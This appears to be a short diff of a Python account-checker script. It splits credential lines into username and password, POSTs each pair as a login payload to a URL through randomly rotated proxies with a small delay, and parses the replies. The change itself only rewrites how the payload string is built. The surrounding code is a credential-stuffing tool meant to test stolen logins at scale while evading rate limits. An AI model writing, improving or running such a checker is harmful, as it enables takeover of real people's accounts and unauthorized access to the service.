@@ -37,13 +37,7 @@ def check():
         proxy = [{"https": "http://"+proxy} for proxy in proxies]
         acc = ligne.strip()
         user = acc.split(':')
-        ################################################################################
-        #a optimiser vraiment pas perforement 
-        payload = "data={\n\t\"identifiant\": \"USER1\",\n\t\"motdepasse\": \"MDP2\"\n}"
-        payload = payload.replace("USER1", user[0])
-        payload = payload.replace("MDP2", user[1])
-        #print(payload)
-        ################################################################################
+        payload = "data={\n\t\"identifiant\": \""+user[0]+"\",\n\t\"motdepasse\": \""+user[1]+"\"\n}"
         r = requests.request("POST", url, headers=headers, data=payload,proxies=random.choice(proxy),timeout=10)
         time.sleep(0.1)
         y = json.loads(r.text)
